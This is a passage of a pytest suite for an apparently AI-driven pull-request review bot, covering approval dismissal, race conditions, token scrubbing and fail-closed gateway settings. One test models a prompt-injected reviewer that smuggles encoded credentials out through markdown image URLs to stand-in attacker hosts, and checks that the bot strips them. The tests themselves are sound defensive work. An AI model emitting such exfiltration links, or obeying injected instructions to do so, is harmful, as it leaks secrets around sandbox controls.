    assert env["AI_GATEWAY_API_KEY"].startswith("pha_")
    mint.assert_not_called()
    assert "llm-gateway.test" in config.outbound_domain_allowlist


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_a_go_gateway_url_without_a_key_fails_closed(team, user, stamphog_chain: StamphogChain) -> None:
    # Production has ONE AI_GATEWAY_URL. A key-only rollback or a URL flip ahead of its key leaves the
    # Go URL with no key; the OAuth token is a standard credential on the Go gateway, so sending it
    # there would run the review uncapped and unpinned. The run must fail before any sandbox exists.
    _repo_config(team.id)
    event = _register_review(stamphog_chain, 121, "sha121a")
    mint = MagicMock()

    with (
        override_settings(AI_GATEWAY_URL="https://ai-gateway.test/v1", AI_GATEWAY_API_KEY=""),
        patch.object(activities.requests, "post", mint),
    ):
        stamphog_chain.post_webhook(event, delivery_id=str(uuid.uuid4()))

    run = ReviewRun.objects.for_team(team.id).latest("created_at")
    assert run.status == ReviewRunStatus.FAILED
    assert "AI_GATEWAY_API_KEY is unset" in (run.error or "")
    assert not stamphog_chain.sandbox_class.created_configs
    assert not OAuthAccessToken.objects.filter(user_id=user.id).exists()
    mint.assert_not_called()
    assert not (run.error or "").startswith("SandboxPhaseError")


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_scoped_token_is_scrubbed_from_persisted_reviewer_output(team, stamphog_chain: StamphogChain) -> None:
    # The per-run phe_ is not in the worker env, so _llm_env_secrets cannot catch it; the explicit
    # gateway_token scrub must keep it out of ReviewRun.output.
    _repo_config(team.id)
    event = _register_review(stamphog_chain, 117, "sha117a")
    leaky_sandbox = fakes.make_fake_sandbox_class("reviewer echoed phe_run\n" + fakes.approved_engine_output())
    mint = MagicMock(return_value=_mint_response(201, {"token": "phe_run"}))

    with (
        override_settings(**_GO_GATEWAY_SETTINGS),
        patch.object(activities.requests, "post", mint),
        patch(
            "products.stamphog.backend.temporal.activities.get_sandbox_class_for_backend",
            lambda backend: leaky_sandbox,
        ),
    ):
        stamphog_chain.post_webhook(event, delivery_id=str(uuid.uuid4()))

    run = ReviewRun.objects.for_team(team.id).latest("created_at")
    assert "phe_run" not in run.output["reviewer_raw"]
    assert "reviewer echoed ***" in run.output["reviewer_raw"]


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_missing_policy_files_fall_back_to_server_defaults(team, stamphog_chain: StamphogChain) -> None:
    # A target repo carrying neither .stamphog/policy.yml nor review-guidance.md must still get a
    # sandbox run, with the hosted defaults injected into the checkout. Regression: run_review_in_sandbox
    # used to hard-fail (FAILED run) when a trusted file was absent.
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    recorder.policy_files.clear()  # repo carries no policy files at all
    author, head_sha = "devex-dev", "sha404a"
    recorder.register_pr(REPO, 101, _pr_object(101, author, head_sha), _pr_files())

    status = stamphog_chain.post_webhook(_opened_event(101, author, head_sha), delivery_id=str(uuid.uuid4()))
    assert status == 202

    run = (
        ReviewRun.objects.for_team(team.id)
        .filter(pull_request__repo_config=repo_config, pull_request__pr_number=101)
        .latest("created_at")
    )
    assert run.status == ReviewRunStatus.COMPLETED

    injected = {path: payload.decode() for path, payload in stamphog_chain.sandbox_writes}
    assert (
        injected[f"{STAMPHOG_SANDBOX_REPO_DIR}/.stamphog/policy.yml"]
        == (POLICY_DEFAULTS_DIR / "policy.yml").read_text()
    )
    assert (
        injected[f"{STAMPHOG_SANDBOX_REPO_DIR}/.stamphog/review-guidance.md"]
        == (POLICY_DEFAULTS_DIR / "review-guidance.md").read_text()
    )
    # No default steering exists, so nothing must be injected at that path either.
    assert f"{STAMPHOG_SANDBOX_REPO_DIR}/.stamphog/steering.md" not in injected


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_default_branch_steering_is_injected_into_sandbox(team, stamphog_chain: StamphogChain) -> None:
    # A repo declaring .stamphog/steering.md on its default branch must see it injected into the
    # checkout so the engine appends it to the reviewer guidance.
    _repo_config(team.id)
    recorder = stamphog_chain.recorder
    recorder.policy_files[".stamphog/steering.md"] = "Prefer squash merges.\n"
    author, head_sha = "devex-dev", "sha505a"
    recorder.register_pr(REPO, 101, _pr_object(101, author, head_sha), _pr_files())

    status = stamphog_chain.post_webhook(_opened_event(101, author, head_sha), delivery_id=str(uuid.uuid4()))
    assert status == 202

    injected = {path: payload.decode() for path, payload in stamphog_chain.sandbox_writes}
    assert injected[f"{STAMPHOG_SANDBOX_REPO_DIR}/.stamphog/steering.md"] == "Prefer squash merges.\n"


@pytest.mark.parametrize(
    "prior_head,prior_verdict,prior_dismissed,expect_dismissed",
    [
        ("sha-old", ReviewVerdict.APPROVED, False, True),
        # Same head is NOT spared at workflow start: a same-head re-review (label re-add, reopen)
        # means fresh judgment is pending, and if it refuses, the earlier approval must not keep
        # the PR mergeable. (Skip paths keep the same-head exclusion — no new verdict is coming.)
        ("sha-new", ReviewVerdict.APPROVED, False, True),
        ("sha-old", ReviewVerdict.APPROVED, True, False),
        # A run that posted its approval to GitHub but crashed before the verdict was saved leaves an
        # orphan the sweep must still find — posted_review_id is the marker, not the saved verdict.
        ("sha-old", ReviewVerdict.NONE, False, True),
    ],
    ids=[
        "old_head_dismissed_and_stamped",
        "same_head_dismissed_at_run_start",
        "already_dismissed_not_redone",
        "orphan_without_saved_verdict_swept",
    ],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_dismiss_stale_approvals(
    team,
    stamphog_chain: StamphogChain,
    prior_head: str,
    prior_verdict: ReviewVerdict,
    prior_dismissed: bool,
    expect_dismissed: bool,
) -> None:
    # Every standing stamphog approval must be dismissed and stamped when a new run starts —
    # old-head (unreviewed commits) and same-head (a re-review whose fresh verdict might refuse)
    # alike. Only an already-dismissed approval is left alone.
    repo_config = _repo_config(team.id)
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=101, author_login="devex-dev"
    )
    prior = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=prior_head,
        status=ReviewRunStatus.COMPLETED if prior_verdict == ReviewVerdict.APPROVED else ReviewRunStatus.FAILED,
        verdict=prior_verdict,
        posted_review_id=555,
        approval_dismissed_at=timezone.now() if prior_dismissed else None,
    )
    current = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pull_request, head_sha="sha-new", status=ReviewRunStatus.QUEUED
    )

    _run_activity(dismiss_stale_approvals, StamphogReviewInput(review_run_id=str(current.id), team_id=team.id))

    dismissals = [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "dismiss_review"]
    prior.refresh_from_db()
    assert len(dismissals) == (1 if expect_dismissed else 0)
    if expect_dismissed:
        assert dismissals[0]["review_id"] == 555
        assert prior.approval_dismissed_at is not None
    elif prior_dismissed:
        assert prior.approval_dismissed_at is not None  # untouched
    else:
        assert prior.approval_dismissed_at is None


@pytest.mark.parametrize(
    "slug,review_login,review_type,review_state,expect_github_dismissed",
    [
        ("stamphog", "stamphog[bot]", "Bot", "APPROVED", True),
        # Slug unset: write-adjacent decisions must not act on a fuzzy "any Bot" match, so nothing.
        ("", "stamphog[bot]", "Bot", "APPROVED", False),
        # A foreign bot's approval is not ours to dismiss.
        ("stamphog", "other-app[bot]", "Bot", "APPROVED", False),
        # An already-inactive (dismissed) review is not active, so nothing to do.
        ("stamphog", "stamphog[bot]", "Bot", "DISMISSED", False),
    ],
    ids=["orphan_swept", "slug_unset_no_op", "foreign_bot_untouched", "already_dismissed_untouched"],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_dismiss_stale_approvals_github_side_sweep(
    team,
    stamphog_chain: StamphogChain,
    slug: str,
    review_login: str,
    review_type: str,
    review_state: str,
    expect_github_dismissed: bool,
) -> None:
    # The DB sweep keys off posted_review_id, so an approval this App left on GitHub with NO ReviewRun
    # row carrying its id is an invisible orphan that stands forever. The GitHub-side belt-and-braces
    # sweep must dismiss our own still-active approval — and only ours, and only with a configured slug.
    repo_config = _repo_config(team.id)
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=130, author_login="devex-dev"
    )
    current = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pull_request, head_sha="sha-new", status=ReviewRunStatus.QUEUED
    )
    # An active approval on GitHub with no ReviewRun.posted_review_id pointing at it — the orphan.
    stamphog_chain.recorder.pr_reviews[(REPO, 130)] = [
        {
            "id": 6161,
            "state": review_state,
            "commit_id": "sha-old",
            "user": {"login": review_login, "type": review_type},
        }
    ]

    with override_settings(STAMPHOG_GITHUB_APP_SLUG=slug):
        result = _run_activity(
            dismiss_stale_approvals, StamphogReviewInput(review_run_id=str(current.id), team_id=team.id)
        )

    dismissals = [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "dismiss_review"]
    if expect_github_dismissed:
        assert [d["review_id"] for d in dismissals] == [6161]
        assert result["github_dismissed"] == 1
    else:
        assert dismissals == []
        assert result["github_dismissed"] == 0


@pytest.mark.parametrize(
    "slug,review_state,review_commit_matches,review_login,review_type,expect_adopt",
    [
        ("stamphog", "APPROVED", True, "stamphog[bot]", "Bot", True),
        # Approval at a different commit doesn't cover this head — post fresh.
        ("stamphog", "APPROVED", False, "stamphog[bot]", "Bot", False),
        # A non-bot or wrong-login author isn't ours — post fresh.
        ("stamphog", "APPROVED", True, "someone", "User", False),
        ("stamphog", "APPROVED", True, "other-app[bot]", "Bot", False),
        # A dismissed review is not active — post fresh.
        ("stamphog", "DISMISSED", True, "stamphog[bot]", "Bot", False),
        # Slug unset: never adopt off a fuzzy match — post fresh.
        ("", "APPROVED", True, "stamphog[bot]", "Bot", False),
    ],
    ids=[
        "adopt_own_active_approval_at_head",
        "different_commit_posts_fresh",
        "non_bot_posts_fresh",
        "wrong_login_bot_posts_fresh",
        "dismissed_posts_fresh",
        "slug_unset_posts_fresh",
    ],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_post_verdict_adopts_own_orphan_approval_instead_of_reposting(
    team,
    stamphog_chain: StamphogChain,
    slug: str,
    review_state: str,
    review_commit_matches: bool,
    review_login: str,
    review_type: str,
    expect_adopt: bool,
) -> None:
    # A prior post_verdict attempt could have posted the approval to GitHub, then crashed before
    # persisting posted_review_id. On retry, re-posting would stack a SECOND standing approval the
    # DB-keyed sweep can never see. So post_verdict must adopt an existing active APPROVE pinned to
    # exactly this head instead of posting again — but only when it's provably ours (exact bot login,
    # active state, matching commit), else it posts fresh.
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    head_sha = "sha131a"
    recorder.register_pr(REPO, 131, _pr_object(131, "devex-dev", head_sha), _pr_files())
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=131, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=head_sha,
        status=ReviewRunStatus.REVIEWING,
        output={"reviewer_raw": fakes.approved_engine_output().splitlines()[-1]},
    )
    recorder.pr_reviews[(REPO, 131)] = [
        {
            "id": 4242,
            "state": review_state,
            "commit_id": head_sha if review_commit_matches else "some-other-sha",
            "user": {"login": review_login, "type": review_type},
        }
    ]

    with override_settings(STAMPHOG_GITHUB_APP_SLUG=slug):
        result = _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    assert result == {"verdict": str(ReviewVerdict.APPROVED)}
    approvals = [w for w in recorder.github_writes if w["kind"] == "approve_review"]
    run.refresh_from_db()
    assert run.status == ReviewRunStatus.COMPLETED
    assert run.verdict == ReviewVerdict.APPROVED
    if expect_adopt:
        assert approvals == []  # adopted the existing approval, never posted a second
        assert run.posted_review_id == 4242
    else:
        assert len(approvals) == 1
        assert run.posted_review_id == approvals[0]["id"]


@pytest.mark.parametrize(
    "include_peer_live_approval",
    [False, True],
    ids=["orphan_only_swept", "peer_live_approval_kept"],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_non_approve_terminal_sweeps_supersession_orphan(
    team, stamphog_chain: StamphogChain, include_peer_live_approval: bool
) -> None:
    # Supersession orphan race: an older run cleared post_verdict's guards, got superseded, then landed its
    # GitHub approval AFTER this newer run's startup sweep already ran. This newer run refuses, so nothing
    # would list our approvals again — the terminal sweep on the refusing run must retract the orphan, or it
    # keeps satisfying branch protection over a refusing verdict. The keep-set case seeds a NEWER run's
    # legitimately-persisted approval too: that one must survive the sweep.
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    head_sha = "sha-refused"
    recorder.register_pr(REPO, 150, _pr_object(150, "devex-dev", head_sha))
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=150, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=head_sha,
        status=ReviewRunStatus.REVIEWING,
        output={"reviewer_raw": _refused_engine_output()},
    )
    # The orphan: an active APPROVE by our bot at an older head, with no live ReviewRun pointing at it.
    github_reviews = [
        {"id": 8181, "state": "APPROVED", "commit_id": "sha-old", "user": {"login": "stamphog[bot]", "type": "Bot"}}
    ]
    if include_peer_live_approval:
        ReviewRun.objects.for_team(team.id).create(
            team_id=team.id,
            pull_request=pull_request,
            head_sha="sha-newer",
            status=ReviewRunStatus.COMPLETED,
            verdict=ReviewVerdict.APPROVED,
            posted_review_id=9191,
        )
        github_reviews.append(
            {
                "id": 9191,
                "state": "APPROVED",
                "commit_id": "sha-newer",
                "user": {"login": "stamphog[bot]", "type": "Bot"},
            }
        )
    recorder.pr_reviews[(REPO, 150)] = github_reviews

    with override_settings(STAMPHOG_GITHUB_APP_SLUG="stamphog"):
        result = _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    assert result == {"verdict": str(ReviewVerdict.REFUSED)}
    run.refresh_from_db()
    assert run.verdict == ReviewVerdict.REFUSED
    # The orphan is always swept; a peer run's live persisted approval (9191) is never touched.
    dismissals = [w for w in recorder.github_writes if w["kind"] == "dismiss_review"]
    assert [d["review_id"] for d in dismissals] == [8181]


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_failed_run_terminal_sweeps_supersession_orphan(team, stamphog_chain: StamphogChain) -> None:
    # A newer run that FAILS leaves the same exposure a refusing one does: an older superseded run's
    # approval can land on GitHub after this run's startup sweep, and a FAILED run never lists approvals
    # again. mark_review_failed must run the GitHub-side sweep at its terminal to retract that orphan.
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=151, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pull_request, head_sha="sha151a", status=ReviewRunStatus.REVIEWING
    )
    recorder.pr_reviews[(REPO, 151)] = [
        {"id": 8282, "state": "APPROVED", "commit_id": "sha-old", "user": {"login": "stamphog[bot]", "type": "Bot"}}
    ]

    with override_settings(STAMPHOG_GITHUB_APP_SLUG="stamphog"):
        _run_activity(
            mark_review_failed,
            MarkReviewFailedInput(review_run_id=str(run.id), team_id=team.id, error="worker lost"),
        )

    run.refresh_from_db()
    assert run.status == ReviewRunStatus.FAILED
    dismissals = [w for w in recorder.github_writes if w["kind"] == "dismiss_review"]
    assert [d["review_id"] for d in dismissals] == [8282]


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_fetch_review_context_carries_inline_review_threads(team, stamphog_chain: StamphogChain) -> None:
    # A maintainer's unresolved inline "do not merge" lives only on the GraphQL review-threads surface;
    # fetch_review_context must carry it onto run.output so the sandbox reviewer sees the blocker.
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    head_sha = "sha132a"
    recorder.register_pr(REPO, 132, _pr_object(132, "devex-dev", head_sha), _pr_files())
    recorder.review_threads[(REPO, 132)] = [
        fakes.review_thread_node(path="src/util.py", comments=[("maintainer", "do not merge")], is_resolved=False)
    ]
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=132, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pull_request, head_sha=head_sha, status=ReviewRunStatus.QUEUED
    )

    _run_activity(fetch_review_context, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    run.refresh_from_db()
    assert run.output["review_threads"] == [
        {
            "is_resolved": False,
            "is_outdated": False,
            "path": "src/util.py",
            "line": 1,
            "comments": [
                {"author": "maintainer", "author_association": "MEMBER", "author_is_bot": False, "body": "do not merge"}
            ],
        }
    ]


@pytest.mark.parametrize(
    "raw_error,expected_stored",
    [
        ("sandbox exploded", "sandbox exploded"),
        # A multi-line raw error (e.g. a yaml.YAMLError echoing .stamphog/policy.yml source lines) must
        # be reduced to its first line — run.error and the event are exposed to stamphog:read, so the
        # continuation lines could leak repository file content.
        ("bad policy at line 3\n  secret_token: sk-live-leak\n  more source", "bad policy at line 3"),
    ],
    ids=["single_line", "multiline_truncated_to_first_line"],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_mark_review_failed_captures_failure_event(team, stamphog_chain, raw_error, expected_stored) -> None:
    # Hosted failures used to be visible only in worker logs; the dashboards need the
    # stamphog_review_failed event next to the review-completed ones. The stored error is scrubbed to
    # its first line so raw exception text can't leak repo file content to stamphog:read.
    repo_config = _repo_config(team.id)
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=101, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pull_request, head_sha="sha-x", status=ReviewRunStatus.REVIEWING
    )

    # ph_scoped_capture is a context manager yielding the capture callable, so the patch
    # provides a context manager whose __enter__ returns the mock to assert against.
    capture_fn = MagicMock()
    with patch("products.stamphog.backend.temporal.activities.ph_scoped_capture") as mock_capture_cm:
        mock_capture_cm.return_value.__enter__.return_value = capture_fn
        mock_capture_cm.return_value.__exit__.return_value = False
        _run_activity(mark_review_failed, MarkReviewFailedInput(str(run.id), team.id, raw_error))

    run.refresh_from_db()
    assert run.status == ReviewRunStatus.FAILED
    assert run.error == expected_stored
    assert capture_fn.call_args.kwargs["event"] == "stamphog_review_failed"
    assert capture_fn.call_args.kwargs["distinct_id"] == "devex-dev"
    props = capture_fn.call_args.kwargs["properties"]
    assert props["stamphog_repo"] == REPO
    assert props["stamphog_error"] == expected_stored


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_reviewer_markdown_images_are_neutralized_before_posting(team, stamphog_chain: StamphogChain) -> None:
    # A prompt-injected reviewer could smuggle an encoded credential into a markdown image URL, and
    # GitHub auto-fetches images through its camo proxy on render — exfiltration around the sandbox
    # egress fence. Images must not survive to the posted body; the surrounding prose must.
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    head_sha = "sha114a"
    recorder.register_pr(REPO, 114, _pr_object(114, "devex-dev", head_sha), _pr_files())
    engine_payload = json.loads(fakes.approved_engine_output().splitlines()[-1])
    engine_payload["review_body"] = (
        'Looks fine. ![exfil](https://evil.example/aGVsbG8=) and <img src="https://evil.example/x"> '
        "plus a reference-style one ![x][leak]\n\n[leak]: https://attacker.example/dG9rZW4=\n\nend."
    )
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=114, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=head_sha,
        status=ReviewRunStatus.REVIEWING,
        output={"reviewer_raw": json.dumps(engine_payload)},
    )

    _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    approvals = [w for w in recorder.github_writes if w["kind"] == "approve_review"]
    body = approvals[0]["body"]["body"]
    assert "evil.example" not in body  # inline image and <img> URLs are removed outright
    assert body.count("[image removed]") == 2
    assert "![" not in body  # reference-style images are demoted to plain links (never auto-fetched)
    assert "[x][leak]" in body
    assert "Looks fine. [image removed]" in body and body.endswith("end.")


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_approval_posted_while_losing_supersession_race_is_dismissed(team, stamphog_chain: StamphogChain) -> None:
    # TOCTOU on the verdict: a delivery can supersede this run after post_verdict's last status
    # recheck but before the terminal save. The approval has already landed on GitHub by then, and
    # the superseding delivery's dismissal sweep ran before the review existed and keys off DB
    # fields this run never got saved — so post_verdict itself must retract the orphan, or an
    # approval nobody owns stands on the PR forever (including after a repo disable, which
    # supersedes active runs the same way).
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    head_sha = "sha116a"
    recorder.register_pr(REPO, 116, _pr_object(116, "devex-dev", head_sha), _pr_files())
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=116, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=head_sha,
        status=ReviewRunStatus.REVIEWING,
        output={"reviewer_raw": fakes.approved_engine_output().splitlines()[-1]},
    )

    # Inject the race at the post seam: the moment GitHub accepts the approval (right before
    # _comment_id extracts its id), a concurrent delivery flips the run to SUPERSEDED — after every
    # pre-write guard, before the conditional terminal save.
    original_comment_id = activities._comment_id

    def _supersede_then_extract(obj: dict) -> int | None:
        ReviewRun.objects.for_team(team.id).filter(id=run.id).update(status=ReviewRunStatus.SUPERSEDED)
        return original_comment_id(obj)

    with patch.object(activities, "_comment_id", side_effect=_supersede_then_extract):
        result = _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    assert result == {"verdict": "skipped_superseded"}
    approvals = [w for w in recorder.github_writes if w["kind"] == "approve_review"]
    dismissals = [w for w in recorder.github_writes if w["kind"] == "dismiss_review"]
    assert len(approvals) == 1
    assert [d["review_id"] for d in dismissals] == [approvals[0]["id"]]
    run.refresh_from_db()
    assert run.status == ReviewRunStatus.SUPERSEDED  # the losing save never resurrected the run
    assert run.posted_review_id == approvals[0]["id"]  # persisted despite the lost terminal save
    assert run.approval_dismissed_at is not None


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_retry_dismisses_orphan_when_superseded_before_the_fresh_status_recheck(
    team, stamphog_chain: StamphogChain
) -> None:
    # A prior attempt posted the approval (id persisted) and crashed before the terminal save; on
    # the Temporal retry, a same-head re-review supersedes the run between the load and the fresh
    # status recheck. The stale-approval sweep excludes same-head approvals, so this early return
    # must retract the orphan itself — and the persisted id must also stop a duplicate approval.
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    head_sha = "sha117a"
    recorder.register_pr(REPO, 117, _pr_object(117, "devex-dev", head_sha), _pr_files())
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=117, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=head_sha,
        status=ReviewRunStatus.REVIEWING,
        posted_review_id=777,
        output={"reviewer_raw": fakes.approved_engine_output().splitlines()[-1]},
    )

    original_parse = activities.parse_reviewer_output

    def _supersede_then_parse(raw: str):
        ReviewRun.objects.for_team(team.id).filter(id=run.id).update(status=ReviewRunStatus.SUPERSEDED)
        return original_parse(raw)

    with patch.object(activities, "parse_reviewer_output", side_effect=_supersede_then_parse):
        result = _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    assert result == {"verdict": "skipped_superseded"}
    assert [w for w in recorder.github_writes if w["kind"] == "approve_review"] == []
    dismissals = [w for w in recorder.github_writes if w["kind"] == "dismiss_review"]
    assert [d["review_id"] for d in dismissals] == [777]
    run.refresh_from_db()
    assert run.approval_dismissed_at is not None


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_retry_after_head_move_never_rewrites_a_terminal_run(team, stamphog_chain: StamphogChain) -> None:
    # A retry can land after the terminal save committed (the trailing digest stamp crashed) AND the
    # PR head moved meanwhile. The head-moved branch must not rewrite the delivered COMPLETED run to
    # SUPERSEDED — terminal states are history; the approval itself is the sweep's job at the next
    # delivery, not this retry's.
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    recorder.register_pr(REPO, 118, _pr_object(118, "devex-dev", "sha-newer"), _pr_files())
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=118, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha="sha-older",
        status=ReviewRunStatus.COMPLETED,
        verdict=ReviewVerdict.APPROVED,
        posted_review_id=555,
        output={"reviewer_raw": fakes.approved_engine_output().splitlines()[-1]},
    )

    result = _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    assert result == {"verdict": "skipped_head_moved"}
    run.refresh_from_db()
    assert run.status == ReviewRunStatus.COMPLETED
    assert run.verdict == ReviewVerdict.APPROVED
    assert [w for w in recorder.github_writes if w["kind"] == "dismiss_review"] == []


@pytest.mark.parametrize(
    "live_base",
    [
        pytest.param({"sha": "master-tip", "ref": "master"}, id="retargeted-to-master"),
        pytest.param({"sha": "parent-tip-2", "ref": "feat/parent"}, id="same-ref-parent-moved"),
    ],
)
@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_post_verdict_skips_when_the_base_moved_under_the_run(
    team, stamphog_chain: StamphogChain, live_base: dict
) -> None:
    # A stacked PR's parent merged mid-review (child retargeted to master), or the parent branch
    # itself moved under the same ref: either rewrites the reviewed diff while the head SHA stays
    # put. The retarget delivery retracts and re-queues, but it can trail this activity —
    # post_verdict must recheck the live base itself, or an approval for the old base..head diff
    # lands on the new one.
    repo_config = _repo_config(team.id)
    recorder = stamphog_chain.recorder
    head_sha = "sha119a"
    live_pr = _pr_object(119, "devex-dev", head_sha) | {"base": live_base}
    recorder.register_pr(REPO, 119, live_pr, _pr_files())
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=119, author_login="devex-dev"
    )
    reviewed_pr = _pr_object(119, "devex-dev", head_sha) | {"base": {"sha": "parent-tip", "ref": "feat/parent"}}
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha=head_sha,
        status=ReviewRunStatus.REVIEWING,
        output={"pr": reviewed_pr, "reviewer_raw": fakes.approved_engine_output().splitlines()[-1]},
    )

    result = _run_activity(post_verdict, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id))

    assert result == {"verdict": "skipped_base_retargeted"}
    assert [w for w in recorder.github_writes if w["kind"] == "approve_review"] == []
    run.refresh_from_db()
    assert run.status == ReviewRunStatus.SUPERSEDED


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_bot_eyes_on_a_later_reactions_page_still_counts_as_in_flight(team, stamphog_chain: StamphogChain) -> None:
    # Anyone can react on a public PR, so an author could bury the trusted bot's fresh 👀 past the
    # first page with junk reactions; a first-page-only fetch would treat the bot as absent and let
    # stamphog approve while that reviewer is still mid-review.
    repo_config = _repo_config(team.id)
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=115, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id, pull_request=pull_request, head_sha="sha115a", status=ReviewRunStatus.QUEUED
    )
    now_iso = timezone.now().strftime("%Y-%m-%dT%H:%M:%SZ")
    junk = [{"user": {"login": f"rando-{i}"}, "content": "heart", "created_at": now_iso} for i in range(100)]
    eyes = {"user": {"login": "greptile-apps[bot]"}, "content": "eyes", "created_at": now_iso}
    stamphog_chain.recorder.pr_reactions[(REPO, 115)] = [*junk, eyes]

    result = _run_activity(
        list_in_flight_reviewer_bots, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id)
    )

    assert result["in_flight"] == ["greptile-apps[bot]"]


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_mark_review_failed_dismisses_an_orphaned_approval(team, stamphog_chain: StamphogChain) -> None:
    # post_verdict can approve on GitHub, persist the id, and then exhaust retries before the
    # terminal save — the workflow's failure path is the last chance to retract that approval:
    # without a future delivery, nothing else ever sweeps a FAILED run's orphan. It's also the last
    # chance to remove the "review in flight" 👀 signal_review_started posted for this same run.
    repo_config = _repo_config(team.id)
    pull_request = PullRequest.objects.for_team(team.id).create(
        team_id=team.id, repo_config=repo_config, pr_number=119, author_login="devex-dev"
    )
    run = ReviewRun.objects.for_team(team.id).create(
        team_id=team.id,
        pull_request=pull_request,
        head_sha="sha119a",
        status=ReviewRunStatus.REVIEWING,
        posted_review_id=888,
        output={"own_eyes_reaction_id": 777},
    )

    with patch("products.stamphog.backend.temporal.activities.ph_scoped_capture") as mock_capture_cm:
        mock_capture_cm.return_value.__enter__.return_value = MagicMock()
        mock_capture_cm.return_value.__exit__.return_value = False
        _run_activity(mark_review_failed, MarkReviewFailedInput(str(run.id), team.id, "terminal save kept failing"))

    dismissals = [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "dismiss_review"]
    assert [d["review_id"] for d in dismissals] == [888]
    removals = [w for w in stamphog_chain.recorder.github_writes if w["kind"] == "remove_reaction"]
    assert [r["reaction_id"] for r in removals] == [777]
    run.refresh_from_db()
    assert run.status == ReviewRunStatus.FAILED
    assert run.approval_dismissed_at is not None


@pytest.mark.django_db(databases=PRODUCT_DATABASES)
def test_mark_review_failed_never_rewrites_a_terminal_run(team) -> None:
    # post_verdict saves COMPLETED (approval already posted to GitHub) before its trailing digest
    # stamp; a failure in that tail must not rewrite the delivered outcome to FAILED.
    repo_config = _repo_config(team.id)
